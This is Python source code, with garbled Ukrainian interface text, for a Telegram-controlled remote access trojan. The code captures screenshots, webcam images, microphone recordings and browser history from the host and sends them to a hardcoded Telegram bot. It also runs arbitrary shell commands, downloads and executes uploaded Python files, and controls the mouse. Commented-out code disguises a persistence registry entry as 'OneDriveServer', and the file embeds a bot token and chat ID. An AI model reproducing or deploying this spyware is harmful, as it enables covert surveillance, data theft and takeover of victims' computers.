import telebot
from telebot import types


import cv2
from PIL import ImageGrab
import os
from browser_history import get_history
import pyaudio
import wave

import time
import pyautogui

#import winreg
# –ü—É—Ç—å –∫ –ø–∞–ø–∫–µ —Å–æ —Å–∫—Ä–∏–ø—Ç–æ–º
#script_path = os.path.abspath("main.py")
# –û—Ç–∫—Ä—ã–≤–∞–µ–º –∫–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞
#key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
# –î–æ–±–∞–≤–ª—è–µ–º –∑–Ω–∞—á–µ–Ω–∏–µ –≤ –∫–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞
#winreg.SetValueEx(key, "OneDriveServer", 0, winreg.REG_SZ, script_path)
# –ó–∞–∫—Ä—ã–≤–∞–µ–º –∫–ª—é—á —Ä–µ–µ—Å—Ç—Ä–∞
#winreg.CloseKey(key)


bot = telebot.TeleBot("5377433922:AAG4QIoFIbtv587e4QJ9a7bo1AKtB4zxK6I")
ID: int = 886293441 #886293441 886293441 1110656480

bot.send_message(ID, "üü¢–û–ù–õ–ê–ô–ùüü¢")

@bot.message_handler(commands=['start', 'help'])
def start(message):
    if message.chat.id == ID:
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        btn1 = types.KeyboardButton("–û—Ç—Ä–∏–º–∞—Ç–∏ —Å–∫—Ä—ñ–Ω—à–æ—Ç –µ–∫—Ä–∞–Ω—É")
        btn2 = types.KeyboardButton("–í—ñ–¥–∫—Ä–∏—Ç–∏ –∫–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫")
        btn3 = types.KeyboardButton("–ö–æ–º–∞–Ω–¥–∏ pyautogui")
        btn4 = types.KeyboardButton("–ó–∞–ø—É—Å—Ç–∏—Ç–∏ Python –∫–æ–¥")
        btn5 = types.KeyboardButton("–û—Ç—Ä–∏–º–∞—Ç–∏ —Ñ–æ—Ç–æ –∑ –∫–∞–º–µ—Ä–∏")
        btn6 = types.KeyboardButton("–û—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–Ω–Ω—ñ –∫–æ–º–ø'—é—Ç–µ—Ä–∞")
        btn7 = types.KeyboardButton("–û—Ç—Ä–∏–º–∞—Ç–∏ —ñ—Å—Ç–æ—Ä—ñ—é –±—Ä–∞—É–∑–µ—Ä–∞")
        btn8 = types.KeyboardButton("–û—Ç—Ä–∏–º–∞—Ç–∏ –∑–≤—É–∫ –∑ –º—ñ–∫—Ä–æ—Ñ–æ–Ω–∞")
        btn9 = types.KeyboardButton("–û–Ω–ª–∞–π–Ω —Å–µ—Ä–≤–µ—Ä")
        markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
        bot.send_message(ID,
                         text="–ü—Ä–∏–≤—ñ—Ç {0.first_name}! –Ø –ø—Ä–∏–≤–∞—Ç–Ω–∏–π –±–æ—Ç —É–¥–∞–ª–µ–Ω–Ω–æ–≥–æ –¥–æ—Å—Ç—É–ø–∞".format(
                             message.from_user), reply_markup=markup)

@bot.message_handler(content_types=['text', 'image', 'document'])
def func(message):
    if message.chat.id == ID:

###########################################################################

        if (message.text == "–û—Ç—Ä–∏–º–∞—Ç–∏ —Å–∫—Ä—ñ–Ω—à–æ—Ç –µ–∫—Ä–∞–Ω—É"):
            screen = ImageGrab.grab()
            bot.send_message(ID, "–ó–Ω—ñ–º–æ–∫ –∑ –µ–∫—Ä–∞–Ω–∞:")
            bot.send_photo(ID, screen)

###########################################################################

        elif (message.text == "–û—Ç—Ä–∏–º–∞—Ç–∏ —ñ—Å—Ç–æ—Ä—ñ—é –±—Ä–∞—É–∑–µ—Ä–∞"):
            outputs = get_history()
            outputs.save("C:\Windows\Temp\history.json")
            his = open('C:\Windows\Temp\history.json', 'rb')
            bot.send_message(ID, "–Ü—Å—Ç–æ—Ä—ñ—è –±—Ä–∞—É–∑–µ—Ä–∞ –¥–ª—è –º–µ–ª–∫–æ–≥–æ —à–∞–ª—É–Ω–∏—à–∫–∏")
            bot.send_document(ID, his)
            his.close()
            os.remove("C:\Windows\Temp\history.json")

###########################################################################

        elif (message.text == "–û—Ç—Ä–∏–º–∞—Ç–∏ –∑–≤—É–∫ –∑ –º—ñ–∫—Ä–æ—Ñ–æ–Ω–∞"):
            reply_record = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("–°–∫–∞—Å—É–≤–∞–Ω–Ω—è", callback_data="back1")
            reply_record.add(back1)
            send_message = bot.send_message(ID, "–í–≤–µ–¥—ñ—Ç—å —Å–∫—ñ–ª—å–∫–∏ —Å–µ–∫—É–Ω–¥ –∑–∞–ø–∏—Å—É–≤–∞—Ç–∏",
                                            reply_markup=reply_record)
            bot.register_next_step_handler(send_message, record)


###########################################################################

        elif message.text == "–û—Ç—Ä–∏–º–∞—Ç–∏ —Ñ–æ—Ç–æ –∑ –∫–∞–º–µ—Ä–∏":
            cap = cv2.VideoCapture(0)
            for i in range(30):
                cap.read()
            ret, image = cap.read()
            path = 'C:\Windows\Temp'
            cv2.imwrite(os.path.join(path, 'cam.jpg'), image)
            cap.release()
            photo = open('C:\Windows\Temp\cam.jpg', 'rb')
            bot.send_message(ID, "–ó–Ω—ñ–º–æ–∫ –∑ –∫–∞–º–µ—Ä–∏")
            bot.send_photo(ID, photo)
            photo.close()
            os.remove("C:\Windows\Temp\cam.jpg")


###########################################################################

        elif message.text == "–í—ñ–¥–∫—Ä–∏—Ç–∏ –∫–æ–º–∞–Ω–¥–Ω–∏–π —Ä—è–¥–æ–∫":
            markup_cmd = types.ReplyKeyboardMarkup(resize_keyboard=True)
            btn_back1 = types.KeyboardButton("–°–∫–∞—Å—É–≤–∞–Ω–Ω—è")
            markup_cmd.add(btn_back1)
            snd_message = bot.send_message(ID, "–í–≤–µ–¥—ñ—Ç—å –∫–æ–º–∞–Ω–¥—É, —è–∫–∞ –≤–∏–∫–æ–Ω–∞—î—Ç—å—Å—è –≤ –∫–æ–º–∞–Ω–¥–Ω–æ–º—É —Ä—è–¥–∫—É",
                                           reply_markup=markup_cmd)
            bot.register_next_step_handler(snd_message, open_cmd)

###########################################################################

        elif (message.text == "–ö–æ–º–∞–Ω–¥–∏ pyautogui"):
            markup_command = types.ReplyKeyboardMarkup(resize_keyboard=True)
            btn1 = types.KeyboardButton("–ü–µ—Ä–µ—Å—É–Ω—É—Ç–∏ –∫—É—Ä—Å–æ—Ä")
            btn2 = types.KeyboardButton("–ù–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ –ª—ñ–≤—É –∫–ª–∞–≤—ñ—à—É –º–∏—à—ñ")
            btn3 = types.KeyboardButton("–ù–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ –ø—Ä–∞–≤—É –∫–ª–∞–≤—ñ—à—É –º–∏—à—ñ")
            back_back = types.KeyboardButton("–ù–∞–∑–∞–¥")
            markup_command.add(btn1, btn2, btn3, back_back)
            bot.send_message(ID, text="–í–∏–±–µ—Ä—ñ—Ç—å –¥—ñ—é", reply_markup=markup_command)

###########################################################################

        elif message.text == "–ó–∞–ø—É—Å—Ç–∏—Ç–∏ Python –∫–æ–¥":
            global start_cod
            start_cod = True
            start_markup = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("–°–∫–∞—Å—É–≤–∞–Ω–Ω—è", callback_data="back3")
            start_markup.add(back1)
            send_message = bot.send_message(ID,
                                            "–ù–∞–¥—ñ—à–ª—ñ—Ç—å –∫–æ–¥ –∑ —Ä–æ–∑—à–∏—Ä–µ–Ω–Ω—è–º .py",
                                            reply_markup=start_markup)
            bot.register_next_step_handler(send_message, start_code)

###########################################################################

        elif message.text == "–ü–µ—Ä–µ—Å—É–Ω—É—Ç–∏ –∫—É—Ä—Å–æ—Ä":
            global move_cur

            move_cur = True
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            back1 = types.InlineKeyboardButton("–°–∫–∞—Å—É–≤–∞–Ω–Ω—è", callback_data="back1")
            reply_curcor.add(back1)
            send_message = bot.send_message(ID, "–í–≤–µ–¥—ñ—Ç—å –∫—É–¥–∏ –ø–µ—Ä–µ—Å—É–Ω—É—Ç–∏ –∫—É—Ä—Å–æ—Ä (x, y) —á–µ—Ä–µ–∑ –∫–æ–º—É. –ü—Ä–∏–∫–ª–∞–¥: 100,100:",
                                            reply_markup=reply_curcor)
            bot.register_next_step_handler(send_message, move_cursor)

###########################################################################

        elif message.text == "–ù–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ –ª—ñ–≤—É –∫–ª–∞–≤—ñ—à—É –º–∏—à—ñ":
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            clickl1 = types.InlineKeyboardButton("–ù–∞—Ç–∏—Å–Ω—É—Ç–∏ 1 —Ä–∞–∑", callback_data="clickl1")
            clickl2 = types.InlineKeyboardButton("–ù–∞—Ç–∏—Å–Ω—É—Ç–∏ 2 —Ä–∞–∑–∏", callback_data="clickl2")
            back2 = types.InlineKeyboardButton("–°–∫–∞—Å—É–≤–∞–Ω–Ω—è", callback_data="back2")
            reply_curcor.add(clickl1, clickl2, back2)
            bot.send_message(ID,
                             "–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ –∫–Ω–æ–ø–∫—É",
                             reply_markup=reply_curcor)

###########################################################################

        elif message.text == "–ù–∞—Ç–∏—Å–Ω—É—Ç–∏ –Ω–∞ –ø—Ä–∞–≤—É –∫–ª–∞–≤—ñ—à—É –º–∏—à—ñ":
            reply_curcor = types.InlineKeyboardMarkup(row_width=1)
            clickr1 = types.InlineKeyboardButton("–ù–∞—Ç–∏—Å–Ω—É—Ç–∏ 1 —Ä–∞–∑", callback_data="clickr1")
            back2 = types.InlineKeyboardButton("–°–∫–∞—Å—É–≤–∞–Ω–Ω—è", callback_data="back2")
            reply_curcor.add(clickr1, back2)
            bot.send_message(ID,
                             "–ù–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ –∫–Ω–æ–ø–∫—É",
                             reply_markup=reply_curcor)
###########################################################################

        elif message.text == "–û—Ç—Ä–∏–º–∞—Ç–∏ –¥–∞–Ω–Ω—ñ –∫–æ–º–ø'—é—Ç–µ—Ä–∞":
            bot.send_message(ID, text="–ó–∞—á–µ–∫–∞–π—Ç–µ –±—É–¥—å-–ª–∞—Å–∫–∞ –ø–∞—Ä—É —Å–µ–∫—É–Ω–¥ –∑–±–∏—Ä–∞—é –¥–∞–Ω–Ω—ñ –¥–ª—è –≤—ñ–¥–ø—Ä–∞–≤–∫–∏".format(message.from_user))
            os.system("python pc_information.py")
            time.sleep(5)
            doc = open("C:\Windows\Temp\info.txt", "rb")
            bot.send_document(ID, doc)
            doc.close()
            os.remove("C:\Windows\Temp\info.txt")

###########################################################################

        elif message.text == "–û–Ω–ª–∞–π–Ω —Å–µ—Ä–≤–µ—Ä":
            bot.send_message(ID, "–ó–∞—á–µ–∫–∞–π—Ç–µ –±—É–¥—å-–ª–∞—Å–∫–∞ –ø–∞—Ä—É —Å–µ–∫—É–Ω–¥, –∑–∞–ø—É—Å–∫–∞—é —Å–µ—Ä–≤–µ—Ä")
            from serv import ngrok_url
            bot.send_message(ID, ngrok_url)


###########################################################################

        elif message.text == "–ù–∞–∑–∞–¥":
            start(message)

###########################################################################

@bot.callback_query_handler(lambda callback: callback.data)
def check(callback):
    if callback.data == "back1":
        global move_cur

        move_cur = False
        bot.delete_message(ID, callback.message.message_id)

###########################################################################

    elif callback.data == "clickl1":
        x, y = pyautogui.position()
        pyautogui.leftClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "–ö–ª–∞–≤—ñ—à–∞ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∞")

###########################################################################

    elif callback.data == "clickl2":
        x, y = pyautogui.position()
        pyautogui.leftClick(x, y)
        pyautogui.leftClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "–ö–ª–∞–≤—ñ—à–∞ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∞")

###########################################################################

    elif callback.data == "clickr1":
        x, y = pyautogui.position()
        pyautogui.rightClick(x, y)
        bot.delete_message(ID, callback.message.message_id)
        bot.send_message(ID, "–ö–ª–∞–≤—ñ—à–∞ –Ω–∞—Ç–∏—Å–Ω—É—Ç–∞")

###########################################################################

    elif callback.data == "back2":
        bot.delete_message(ID, callback.message.message_id)

###########################################################################

    elif callback.data == "back3":
        global start_cod

        start_cod = False
        bot.delete_message(ID, callback.message.message_id)

def open_cmd(message):
    if message.text == "–°–∫–∞—Å—É–≤–∞–Ω–Ω—è":
        start(message)
    else:
        rez = os.system(message.text)

        if rez == 0:
            bot.send_message(ID, "–ö–æ–º–∞–Ω–¥–∞ –≤–∏–∫–æ–Ω–∞–Ω–∞ —É—Å–ø—ñ—à–Ω–æ")
        else:
            bot.send_message(ID, "–£–≤–∞–≥–∞! –ü–æ–º–∏–ª–∫–∞!")
        start(message)

def move_cursor(message):
    if move_cur:
        try:
            x, y = map(int, message.text.split(","))
            pyautogui.moveTo(x, y)
            bot.send_message(ID, "–ö—É—Ä—Å–æ—Ä –ø–æ—Å—É–Ω—É—Ç–∏–π")
        except:
            bot.send_message(ID, "–ü–æ–º–∏–ª–∫–∞")
            message.text = "–ü–µ—Ä–µ—Å—É–Ω—É—Ç–∏ –∫—É—Ä—Å–æ—Ä"
            func(message)
    else:
        func(message)

def start_code(message):
    if start_cod:
        file = bot.get_file(message.document.file_id)
        filename, file_extension = os.path.splitext(file.file_path)

        b = "qadrw" + file_extension

        save_photo = bot.download_file(file.file_path)

        with open(b, 'wb') as new_file:
            new_file.write(save_photo)

        bot.send_message(ID, f"–ö–æ–¥ –ø—Ä–∏–π–Ω—è—Ç–∏–π")
        os.startfile(b)
        bot.send_message(ID, f"–ö–æ–¥ –∑–∞–ø—É—â–µ–Ω–∏–π")
    else:
        func(message)

def record(message):
    if message.text == "–°–∫–∞—Å—É–≤–∞–Ω–Ω—è":
        start(message)
    else:
        try:
            RECORD_SECONDS = int(message.text)
            CHUNK = 1024
            FORMAT = pyaudio.paInt16
            CHANNELS = 2
            RATE = 44100
            WAVE_OUTPUT_FILENAME = "C:\Windows\Temp/0.wav"

            p = pyaudio.PyAudio()



            stream = p.open(
                            format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            input=True,
                            frames_per_buffer=CHUNK
                            )

            bot.send_message(ID, "–ó–∞–ø–∏—Å—É—é")
            print("* recording")

            frames = []

            for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                data = stream.read(CHUNK)
                frames.append(data)

            bot.send_message(ID, "–ó–∞–ø–∏—Å–∞–≤")
            print("* done recording")

            stream.stop_stream()
            stream.close()
            p.terminate()

            wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()
            bot.send_message(ID, "–í—ñ–¥–ø—Ä–∞–≤–ª—è—é")
            rec = open("C:\Windows\Temp/0.wav", "rb")
            bot.send_document(ID, rec)
            rec.close()
            os.remove("C:\Windows\Temp/0.wav")
        except:
            bot.send_message(ID, "–ü–æ–º–∏–ª–∫–∞ —É–≤–≤–µ–¥—ñ—Ç—å —Ç—ñ–ª—å–∫–∏ —á–∏—Å–ª–æ")
            message.text = "–û—Ç—Ä–∏–º–∞—Ç–∏ –∑–≤—É–∫ –∑ –º—ñ–∫—Ä–æ—Ñ–æ–Ω–∞"
            func(message)


bot.polling(none_stop=True)
bot.send_message(ID, "üî¥–û–§–õ–ê–ô–ùüî¥")
